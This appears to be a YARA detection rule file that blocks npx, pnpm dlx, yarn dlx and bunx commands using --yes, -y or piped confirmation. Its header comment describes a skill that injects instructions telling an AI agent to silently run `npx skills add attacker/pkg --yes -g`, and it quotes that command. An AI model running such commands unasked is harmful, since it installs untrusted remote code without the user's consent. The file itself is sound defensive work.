// Catches npx / pnpm dlx / yarn dlx / bunx with auto-confirm flags (--yes,
// -y) or piped confirmation (yes | npx ...).
//
// Auto-confirm bypasses the interactive prompt that asks the user whether to
// install and run a remote package. Combined with a package name the victim
// didn't choose, this is the supply-chain vector used by roin-orca/skills
// on skills.sh (May 2026): a skill tells the agent to silently
// `npx skills add attacker/pkg --yes -g`, which installs a second malicious
// skill without any human confirmation.
//
// Note: `npx <pkg>` *without* --yes still prompts — we intentionally do NOT
// flag that, to avoid false-positives on normal one-off tool usage.
//
// Known false positive: CI scripts that use `npx create-next-app --yes` or
// similar scaffolding commands. Consumers should allow-list known-good
// packages if needed.

rule supply_chain_npx_auto_confirm
{
    meta:
        description = "npx / pnpm dlx / yarn dlx / bunx with an auto-confirm flag (--yes or -y) or piped confirmation (yes | ...). Bypasses the interactive install prompt, allowing silent execution of arbitrary remote packages — a known supply-chain vector."
        remediation = "Remove the --yes / -y flag so the user is prompted before any package is fetched and executed. Better yet, pin the exact package version and install it locally."
        severity = "critical"
        category = "supply_chain"
        action = "block"

    strings:
        // npx <anything> --yes or -y (flag before or after package)
        $npx_yes      = /\bnpx\s+[^\n]{0,200}(\s--yes\b|\s-y\b)/

        // pnpm dlx with --yes or -y
        $pnpm_dlx_yes = /\bpnpm\s+dlx\s+[^\n]{0,200}(\s--yes\b|\s-y\b)/

        // yarn dlx with --yes or -y
        $yarn_dlx_yes = /\byarn\s+dlx\s+[^\n]{0,200}(\s--yes\b|\s-y\b)/

        // bunx with --yes or -y
        $bunx_yes     = /\bbunx\s+[^\n]{0,200}(\s--yes\b|\s-y\b)/

        // Piped confirmation: yes | npx / dlx / bunx
        $yes_pipe_npx      = /\byes\s*\|\s*npx\s/
        $yes_pipe_pnpm_dlx = /\byes\s*\|\s*pnpm\s+dlx\s/
        $yes_pipe_yarn_dlx = /\byes\s*\|\s*yarn\s+dlx\s/
        $yes_pipe_bunx     = /\byes\s*\|\s*bunx\s/

        // echo y | variant
        $echo_y_pipe_npx      = /\becho\s+["']?y(es)?["']?\s*\|\s*npx\s/
        $echo_y_pipe_pnpm_dlx = /\becho\s+["']?y(es)?["']?\s*\|\s*pnpm\s+dlx\s/
        $echo_y_pipe_yarn_dlx = /\becho\s+["']?y(es)?["']?\s*\|\s*yarn\s+dlx\s/
        $echo_y_pipe_bunx     = /\becho\s+["']?y(es)?["']?\s*\|\s*bunx\s/

    condition:
        any of them
}
